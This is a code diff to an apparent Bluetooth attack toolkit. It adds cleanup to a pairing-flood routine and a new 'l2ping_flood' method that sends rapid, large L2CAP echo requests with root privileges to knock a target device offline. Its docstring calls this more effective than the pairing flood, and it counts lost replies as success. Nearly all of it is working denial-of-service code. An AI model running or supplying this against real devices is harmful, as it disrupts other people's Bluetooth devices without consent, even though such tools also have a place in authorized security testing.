@@ -218,6 +218,9 @@ class PairingFlood:
             else:
                 info("No obvious rate limiting detected")
 
+        # Clean up pairing state
+        run_cmd(["bluetoothctl", "remove", self.address], timeout=5)
+
         return {
             "target": self.address,
             "attempts": attempts,
@@ -225,3 +228,63 @@ class PairingFlood:
             "rate_limited": rate_limited,
             "avg_time": round(sum(timings) / len(timings), 3) if timings else 0,
         }
+
+    def l2ping_flood(self, count: int = 1000, size: int = 600,
+                      flood: bool = True) -> dict:
+        """L2CAP echo request flood using l2ping.
+
+        More effective than pairing flood — sends L2CAP echo requests that
+        the target must process. With -f (flood) mode, sends as fast as possible.
+
+        Args:
+            count: Number of pings to send
+            size: Ping payload size in bytes (max 65535)
+            flood: Use flood mode (-f, requires root)
+        """
+        from bt_tap.utils.bt_helpers import check_tool
+        if not check_tool("l2ping"):
+            error("l2ping not found. Install: apt install bluez")
+            return {"error": "l2ping not installed"}
+
+        info(f"L2CAP ping flood: {self.address} ({count} pings, {size} bytes)")
+
+        cmd = ["sudo", "l2ping", "-i", self.hci,
+               "-c", str(count), "-s", str(min(size, 65535))]
+        if flood:
+            cmd.append("-f")
+        cmd.append(self.address)
+
+        start_time = time.time()
+        result = run_cmd(cmd, timeout=count * 2 + 30)
+        elapsed = time.time() - start_time
+
+        output = result.stdout + result.stderr
+        # Parse results
+        sent = 0
+        received = 0
+        for line in output.splitlines():
+            if "bytes from" in line.lower():
+                received += 1
+                sent += 1
+            elif "no response" in line.lower() or "timed out" in line.lower():
+                sent += 1
+
+        rate = sent / elapsed if elapsed > 0 else 0
+        summary = {
+            "target": self.address,
+            "sent": sent,
+            "received": received,
+            "lost": sent - received,
+            "elapsed_seconds": round(elapsed, 2),
+            "rate_per_second": round(rate, 2),
+            "flood_mode": flood,
+            "payload_size": size,
+        }
+
+        if received < sent:
+            success(f"L2ping complete: {sent} sent, {sent - received} lost "
+                    f"({elapsed:.1f}s, {rate:.0f} pps)")
+        else:
+            info(f"L2ping complete: {sent} sent, all responded ({elapsed:.1f}s)")
+
+        return summary
